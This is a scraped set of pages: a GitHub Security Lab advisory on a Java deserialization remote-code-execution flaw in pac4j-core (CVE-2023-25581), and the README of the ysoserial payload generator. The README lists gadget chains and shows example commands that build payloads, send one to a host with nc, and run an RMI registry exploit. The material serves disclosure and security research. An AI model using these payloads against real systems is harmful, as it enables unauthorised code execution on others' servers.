=== Content from securitylab.github.com_f7533115_20250111_134538.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

October 10, 2024
# GHSL-2022-085: Java deserialization leading to RCE in pac4j-core - CVE-2023-25581

[![Author avatar](https://avatars.githubusercontent.com/u/44605151)
Michael Stepankin](https://github.com/artsploit)

## Coordinated Disclosure Timeline

* 2023-02-02: Report sent to security@pac4j.org
* 2023-02-14: Acknowledged by the development team, CVE is issued. The fix is available with version 4.0

## Summary

`pac4j-core` prior to version 4 is affected by a Java deserialization vulnerability. The vulnerability affects systems that store externally controlled values in attributes of the `UserProfile` class from pac4j-core. It can be exploited by providing an attribute that contains a serialized Java object with a special prefix `{#sb64}` and Base64 encoding.

## Product

pac4j-core

## Tested Version

[v3.8.3](https://github.com/pac4j/pac4j/tree/pac4j-3.8.3)

## Details

### Issue: Deserialization of untrusted data in `InternalAttributeHandler` (`GHSL-2022-085`)

The method [`org.pac4j.core.profile.InternalAttributeHandler#restore`](https://github.com/pac4j/pac4j/blob/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j/core/profile/InternalAttributeHandler.java#L95) deserializes untrusted data:

```
public Object restore(final Object value) {
      if (value != null && value instanceof String) {
          final String sValue = (String) value;
          if (sValue.startsWith(PREFIX)) {
              if (sValue.startsWith(PREFIX_BOOLEAN)) {
                  return Boolean.parseBoolean(sValue.substring(PREFIX_BOOLEAN.length()));
              } else if (sValue.startsWith(PREFIX_INT)) {
                  return Integer.parseInt(sValue.substring(PREFIX_INT.length()));
              } else if (sValue.startsWith(PREFIX_LONG)) {
                  return Long.parseLong(sValue.substring(PREFIX_LONG.length()));
              } else if (sValue.startsWith(PREFIX_DATE)) {
                  final String d = sValue.substring(PREFIX_DATE.length());
                  try {
                      return newSdf().parse(d);
                  } catch (final ParseException e) {
                      logger.warn("Unable to parse stringified date: {}", d, e);
                  }
              } else if (sValue.startsWith(PREFIX_URI)) {
                  final String uri = sValue.substring(PREFIX_URI.length());
                  try {
                      return new URI(uri);
                  } catch (final URISyntaxException e) {
                      logger.warn("Unable to parse stringified URI: {}", uri, e);
                  }
              } else if (sValue.startsWith(PREFIX_SB64)) {
                  return serializationHelper.unserializeFromBase64(sValue.substring(PREFIX_SB64.length()));
              }
          }
      }
      return value;
  }

```

The logic inside [`InternalAttributeHandler#prepare`](https://github.com/pac4j/pac4j/blob/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j/core/profile/InternalAttributeHandler.java#L44) method is designed to support different attribute types, such as `String`, `Boolean`, `Data` or `URI`. When it comes to storing objects of arbitrary type, it uses Java serialization with `ObjectInputStream` and add a special prefix `{#sb64}`. When an attribute is restored, the code inside [`InternalAttributeHandler#restore`](https://github.com/pac4j/pac4j/blob/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j/core/profile/InternalAttributeHandler.java#L95) checks the prefix and constructs the corresponding type. This logic is flawed for string attributes, as [`InternalAttributeHandler#prepare`](https://github.com/pac4j/pac4j/blob/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j/core/profile/InternalAttributeHandler.java#L44) does not check if a string value already starts with `{#sb64}`. If an externally controlled string is stored as an attribute, it’s possible to trick the program to perform a deserialization of an arbitrary Java class. For example, if the `username` or `email` are stored as attributes, it’s possible to use the `username` like `{#sb64}rO0ABXN...serizalized_object_in_base64...` to trigger the deserialization vulnerability.

#### Impact

This issue may lead to Remote Code Execution (RCE) in the worst case. Although a `RestrictedObjectInputStream` is in place, that puts some restriction on what classes can be deserialized, it still allows a broad range of java packages and potentially exploitable with different gadget chains.

#### Resources

* [Insecure deserialization](https://portswigger.net/web-security/deserialization)
* [Ysoserial project](https://github.com/frohoff/ysoserial)

## CVE

* CVE-2023-25581

## Credit

This issue was discovered and reported by GHSL team member [@artsploit (Michael Stepankin)](https://github.com/artsploit).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2022-085` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_0b614edf_20250111_134536.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffrohoff%2Fysoserial)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffrohoff%2Fysoserial)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=frohoff%2Fysoserial)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[frohoff](/frohoff)
/
**[ysoserial](/frohoff/ysoserial)**
Public

* [Notifications](/login?return_to=%2Ffrohoff%2Fysoserial) You must be signed in to change notification settings
* [Fork
  1.8k](/login?return_to=%2Ffrohoff%2Fysoserial)
* [Star
   7.9k](/login?return_to=%2Ffrohoff%2Fysoserial)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

[frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/ "http://frohoff.github.io/appseccali-marshalling-pickles/")

### License

[MIT license](/frohoff/ysoserial/blob/master/LICENSE.txt)

[7.9k
stars](/frohoff/ysoserial/stargazers) [1.8k
forks](/frohoff/ysoserial/forks) [Branches](/frohoff/ysoserial/branches) [Tags](/frohoff/ysoserial/tags) [Activity](/frohoff/ysoserial/activity)
 [Star](/login?return_to=%2Ffrohoff%2Fysoserial)

 [Notifications](/login?return_to=%2Ffrohoff%2Fysoserial) You must be signed in to change notification settings

* [Code](/frohoff/ysoserial)
* [Issues
  24](/frohoff/ysoserial/issues)
* [Pull requests
  23](/frohoff/ysoserial/pulls)
* [Discussions](/frohoff/ysoserial/discussions)
* [Actions](/frohoff/ysoserial/actions)
* [Projects
  0](/frohoff/ysoserial/projects)
* [Wiki](/frohoff/ysoserial/wiki)
* [Security](/frohoff/ysoserial/security)
* [Insights](/frohoff/ysoserial/pulse)

Additional navigation options

* [Code](/frohoff/ysoserial)
* [Issues](/frohoff/ysoserial/issues)
* [Pull requests](/frohoff/ysoserial/pulls)
* [Discussions](/frohoff/ysoserial/discussions)
* [Actions](/frohoff/ysoserial/actions)
* [Projects](/frohoff/ysoserial/projects)
* [Wiki](/frohoff/ysoserial/wiki)
* [Security](/frohoff/ysoserial/security)
* [Insights](/frohoff/ysoserial/pulse)

# frohoff/ysoserial

    master[Branches](/frohoff/ysoserial/branches)[Tags](/frohoff/ysoserial/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[173 Commits](/frohoff/ysoserial/commits/master/) | | |
| [.github/workflows](/frohoff/ysoserial/tree/master/.github/workflows "This path skips through empty directories") | | [.github/workflows](/frohoff/ysoserial/tree/master/.github/workflows "This path skips through empty directories") |  |  |
| [src](/frohoff/ysoserial/tree/master/src "src") | | [src](/frohoff/ysoserial/tree/master/src "src") |  |  |
| [.editorconfig](/frohoff/ysoserial/blob/master/.editorconfig ".editorconfig") | | [.editorconfig](/frohoff/ysoserial/blob/master/.editorconfig ".editorconfig") |  |  |
| [.gitignore](/frohoff/ysoserial/blob/master/.gitignore ".gitignore") | | [.gitignore](/frohoff/ysoserial/blob/master/.gitignore ".gitignore") |  |  |
| [.travis.yml](/frohoff/ysoserial/blob/master/.travis.yml ".travis.yml") | | [.travis.yml](/frohoff/ysoserial/blob/master/.travis.yml ".travis.yml") |  |  |
| [DISCLAIMER.txt](/frohoff/ysoserial/blob/master/DISCLAIMER.txt "DISCLAIMER.txt") | | [DISCLAIMER.txt](/frohoff/ysoserial/blob/master/DISCLAIMER.txt "DISCLAIMER.txt") |  |  |
| [Dockerfile](/frohoff/ysoserial/blob/master/Dockerfile "Dockerfile") | | [Dockerfile](/frohoff/ysoserial/blob/master/Dockerfile "Dockerfile") |  |  |
| [LICENSE.txt](/frohoff/ysoserial/blob/master/LICENSE.txt "LICENSE.txt") | | [LICENSE.txt](/frohoff/ysoserial/blob/master/LICENSE.txt "LICENSE.txt") |  |  |
| [README.md](/frohoff/ysoserial/blob/master/README.md "README.md") | | [README.md](/frohoff/ysoserial/blob/master/README.md "README.md") |  |  |
| [appveyor.yml](/frohoff/ysoserial/blob/master/appveyor.yml "appveyor.yml") | | [appveyor.yml](/frohoff/ysoserial/blob/master/appveyor.yml "appveyor.yml") |  |  |
| [assembly.xml](/frohoff/ysoserial/blob/master/assembly.xml "assembly.xml") | | [assembly.xml](/frohoff/ysoserial/blob/master/assembly.xml "assembly.xml") |  |  |
| [pom.xml](/frohoff/ysoserial/blob/master/pom.xml "pom.xml") | | [pom.xml](/frohoff/ysoserial/blob/master/pom.xml "pom.xml") |  |  |
| [ysoserial.png](/frohoff/ysoserial/blob/master/ysoserial.png "ysoserial.png") | | [ysoserial.png](/frohoff/ysoserial/blob/master/ysoserial.png "ysoserial.png") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license
# ysoserial

[![GitHub release](https://camo.githubusercontent.com/8e5a5f4bc023432be91d3027ee360f278fec3d3d2bd5c20329d439e483ae713c/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732f66726f686f66662f79736f73657269616c2f6c61746573742f746f74616c)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
[![Travis Build Status](https://camo.githubusercontent.com/994269f400cc36c5e6cd5ac46479d490a830858ccf3186e436fac5596cbaded7/68747470733a2f2f6170692e7472617669732d63692e636f6d2f66726f686f66662f79736f73657269616c2e7376673f6272616e63683d6d6173746572)](https://travis-ci.com/github/frohoff/ysoserial)
[![Appveyor Build status](https://camo.githubusercontent.com/c9d8d34950b389520c970da7cec97e35de3bf7f68a91f824b9d0cf7f0d7b349d/68747470733a2f2f63692e6170707665796f722e636f6d2f6170692f70726f6a656374732f7374617475732f613874626b39626c67723379757434672f6272616e63682f6d61737465723f7376673d74727565)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
[![JitPack](https://camo.githubusercontent.com/cf9ef819e9c8068f88eb9514aee1da823681b173b7f735173324870891751ab2/68747470733a2f2f6a69747061636b2e696f2f762f66726f686f66662f79736f73657269616c2e737667)](https://jitpack.io/#frohoff/ysoserial)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

[![logo](/frohoff/ysoserial/raw/master/ysoserial.png)](/frohoff/ysoserial/blob/master/ysoserial.png)

## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](https://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

**ysoserial** is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing **unsafe deserialization** of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```
$  java -jar ysoserial.jar
Y SO SERIAL?
Usage: java -jar ysoserial.jar [payload] '[command]'
  Available payload types:
     Payload             Authors                     Dependencies
     -------             -------                     ------------
     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure             @JackOfMostTrades           clojure:1.8.0
     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                    commons-collections:3.1
     CommonsCollections2 @frohoff                    commons-collections4:4.0
     CommonsCollections3 @frohoff                    commons-collections:3.1
     CommonsCollections4 @frohoff                    commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                    groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser            js:1.7R2
     MozillaRhino2       @_tint0                     js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                   rome:1.0
     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
```

## Examples

```
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## Installation

[![GitHub release](https://camo.githubusercontent.com/8e5a5f4bc023432be91d3027ee360f278fec3d3d2bd5c20329d439e483ae713c/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732f66726f686f66662f79736f73657269616c2f6c61746573742f746f74616c)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)

Download the [latest release jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar) from GitHub releases.

## Building

Requires Java 1.7+ and Maven 3.x+

`mvn clean package -DskipTests`

## Code Status

[![Build Status](https://camo.githubusercontent.com/994269f400cc36c5e6cd5ac46479d490a830858ccf3186e436fac5596cbaded7/68747470733a2f2f6170692e7472617669732d63692e636f6d2f66726f686f66662f79736f73657269616c2e7376673f6272616e63683d6d6173746572)](https://travis-ci.com/github/frohoff/ysoserial)
[![Build status](https://camo.githubusercontent.com/c9d8d34950b389520c970da7cec97e35de3bf7f68a91f824b9d0cf7f0d7b349d/68747470733a2f2f63692e6170707665796f722e636f6d2f6170692f70726f6a656374732f7374617475732f613874626b39626c67723379757434672f6272616e63682f6d61737465723f7376673d74727565)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request

## See Also

* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization

## About

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

[frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/ "http://frohoff.github.io/appseccali-marshalling-pickles/")

### Topics

[java](/topics/java "Topic: java")
[serialization](/topics/serialization "Topic: serialization")
[exploit](/topics/exploit "Topic: exploit")
[jvm](/topics/jvm "Topic: jvm")
[deserialization](/topics/deserialization "Topic: deserialization")
[gadget](/topics/gadget "Topic: gadget")
[poc](/topics/poc "Topic: poc")
[vulnerability](/topics/vulnerability "Topic: vulnerability")
[javadeser](/topics/javadeser "Topic: javadeser")

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/frohoff/ysoserial/activity)
### Stars

[**7.9k**
stars](/frohoff/ysoserial/stargazers)
### Watchers

[**213**
watching](/frohoff/ysoserial/watchers)
### Forks

[**1.8k**
forks](/frohoff/ysoserial/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Ffrohoff%2Fysoserial&report=frohoff+%28user%29)

## [Releases 1](/frohoff/ysoserial/releases)

[v0.0.6
Latest

Jun 29, 2022](/frohoff/ysoserial/releases/tag/v0.0.6)

## [Packages 0](/users/frohoff/packages?repo_name=ysoserial)

No packages published

## [Contributors 33](/frohoff/ysoserial/graphs/contributors)

* [![@frohoff](https://avatars.githubusercontent.com/u/6477?s=64&v=4)](https://github.com/frohoff)
* [![@mbechler](https://avatars.githubusercontent.com/u/4471061?s=64&v=4)](https://github.com/mbechler)
* [![@matthiaskaiser](https://avatars.githubusercontent.com/u/4790750?s=64&v=4)](https://github.com/matthiaskaiser)
* [![@jacob-baines](https://avatars.githubusercontent.com/u/787916?s=64&v=4)](https://github.com/jacob-baines)
* [![@supersache](https://avatars.githubusercontent.com/u/42678777?s=64&v=4)](https://github.com/supersache)
* [![@pwntester](https://avatars.githubusercontent.com/u/125701?s=64&v=4)](https://github.com/pwntester)
* [![@Alexandre-Bartel](https://avatars.githubusercontent.com/u/655248?s=64&v=4)](https://github.com/Alexandre-Bartel)
* [![@drwetter](https://avatars.githubusercontent.com/u/8036727?s=64&v=4)](https://github.com/drwetter)
* [![@aphtrinh](https://avatars.githubusercontent.com/u/8997320?s=64&v=4)](https://github.com/aphtrinh)
* [![@SkylarWatson](https://avatars.githubusercontent.com/u/182551?s=64&v=4)](https://github.com/SkylarWatson)
* [![@ltearno](https://avatars.githubusercontent.com/u/191069?s=64&v=4)](https://github.com/ltearno)
* [![@relaxnow](https://avatars.githubusercontent.com/u/524386?s=64&v=4)](https://github.com/relaxnow)
* [![@h3xstream](https://avatars.githubusercontent.com/u/593130?s=64&v=4)](https://github.com/h3xstream)
* [![@jasinner](https://avatars.githubusercontent.com/u/950644?s=64&v=4)](https://github.com/jasinner)

[+ 19 contributors](/frohoff/ysoserial/graphs/contributors)

## Languages

* [Java
  99.8%](/frohoff/ysoserial/search?l=java)
* [Dockerfile
  0.2%](/frohoff/ysoserial/search?l=dockerfile)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from portswigger.net_03b2b90c_20250111_134538.html ===


[Login](/users)

Products

Solutions

[Research](/research)
[Academy](/web-security)
Support

Company

[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)

[My account](/users/youraccount)
[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)
[![Burp Suite Enterprise Edition](/content/images/svg/icons/enterprise.svg)
**Burp Suite Enterprise Edition**
The enterprise-enabled dynamic web vulnerability scanner.](/burp/enterprise)
[![Burp Suite Professional](/content/images/svg/icons/professional.svg)
**Burp Suite Professional**
The world's #1 web penetration testing toolkit.](/burp/pro)
[![Burp Suite Community Edition](/content/images/svg/icons/community.svg)
**Burp Suite Community Edition**
The best manual tools to start web security testing.](/burp/communitydownload)
[![Dastardly, from Burp Suite](/mega-nav/images/dastardly.svg)
**Dastardly, from Burp Suite**
Free, lightweight web application security scanning for CI/CD.](/burp/dastardly)
[View all product editions](/burp)

[**Burp Scanner**

Burp Suite's web vulnerability scanner

![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg)](/burp/vulnerability-scanner)

[**Attack surface visibility**
Improve security posture, prioritize manual testing, free up time.](/solutions/attack-surface-visibility)
[**CI-driven scanning**
More proactive security - find and fix vulnerabilities earlier.](/solutions/ci-driven-scanning)
[**Application security testing**
See how our software enables the world to secure the web.](/solutions)
[**DevSecOps**
Catch critical bugs; ship more secure software, more quickly.](/solutions/devsecops)
[**Penetration testing**
Accelerate penetration testing - find more bugs, more quickly.](/solutions/penetration-testing)
[**Automated scanning**
Scale dynamic scanning. Reduce risk. Save time/money.](/solutions/automated-security-testing)
[**Bug bounty hunting**
Level up your hacking and earn more bug bounties.](/solutions/bug-bounty-hunting)
[**Compliance**
Enhance security monitoring to comply with confidence.](/solutions/compliance)

[View all solutions](/solutions)

[**Product comparison**

What's the difference between Pro and Enterprise Edition?

![Burp Suite Professional vs Burp Suite Enterprise Edition](/mega-nav/images/burp-suite.jpg)](/burp/enterprise/resources/enterprise-edition-vs-professional)

[**Support Center**
Get help and advice from our experts on all things Burp.](/support)
[**Documentation**
Tutorials and guides for Burp Suite.](/burp/documentation)
[**Get Started - Professional**
Get started with Burp Suite Professional.](/burp/documentation/desktop/getting-started)
[**Get Started - Enterprise**
Get started with Burp Suite Enterprise Edition.](/burp/documentation/enterprise/getting-started)
[**User Forum**
Get your questions answered in the User Forum.](https://forum.portswigger.net/)
[**Downloads**
Download the latest version of Burp Suite.](/burp/releases)

[Visit the Support Center](/support)

[**Downloads**

Download the latest version of Burp Suite.

![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg)](/burp/releases)

Academy home

* [Dashboard](https://portswigger.net/web-security/index.html)
* [Learning paths](https://portswigger.net/web-security/learning-paths)
* Latest topics

  [Web cache deception](/web-security/web-cache-deception)
  [Web LLM attacks](/web-security/llm-attacks)
  [API testing](/web-security/api-testing)
  [NoSQL injection](/web-security/nosql-injection)
  [Race conditions](/web-security/race-conditions)
  [View all topics](/web-security/all-topics)
* All content

  [All labs](/web-security/all-labs)
  [All topics](/web-security/all-topics)
  [Mystery labs](/web-security/mystery-lab-challenge)
* Hall of Fame

  [Leaderboard](https://portswigger.net/web-security/hall-of-fame)
  [Interview - Kamil Vavra](https://portswigger.net/web-security/getting-started/kamil-vavra/index.html)
  [Interview - Johnny Villarreal](https://portswigger.net/web-security/getting-started/johnny-villarreal/index.html)
  [Interview - Andres Rauschecker](https://portswigger.net/web-security/getting-started/andres-rauschecker/index.html)
* [Get started](https://portswigger.net/web-security/getting-started/index.html)
* Get certified

  [Get certified](https://portswigger.net/web-security/certification/index.html)
  [How to prepare](https://portswigger.net/web-security/certification/how-to-prepare/index.html)
  [How it works](https://portswigger.net/web-security/certification/how-it-works/index.html)
  [Practice exam](https://portswigger.net/web-security/certification/practice-exam/index.html)
  [Exam hints and guidance](https://portswigger.net/web-security/certification/exam-hints-and-guidance/index.html)
  [What the exam involves](https://portswigger.net/web-security/certification/how-it-works/index.html#what-the-exam-involves)
  [FAQs](https://portswigger.net/web-security/certification/frequently-asked-questions/index.html)
  [Validate your certification](https://portswigger.net/web-security/certification#validate-your-certification)

[Back to all topics](/web-security/all-topics)

### Insecure deserialization

* [What is serialization?](/web-security/deserialization#what-is-serialization)
* [Serialization vs deserialization](/web-security/deserialization#serialization-vs-deserialization)
* [What is insecure deserialization?](/web-security/deserialization#what-is-insecure-deserialization)
* [How vulnerabilities arise](/web-security/deserialization#how-do-insecure-deserialization-vulnerabilities-arise)
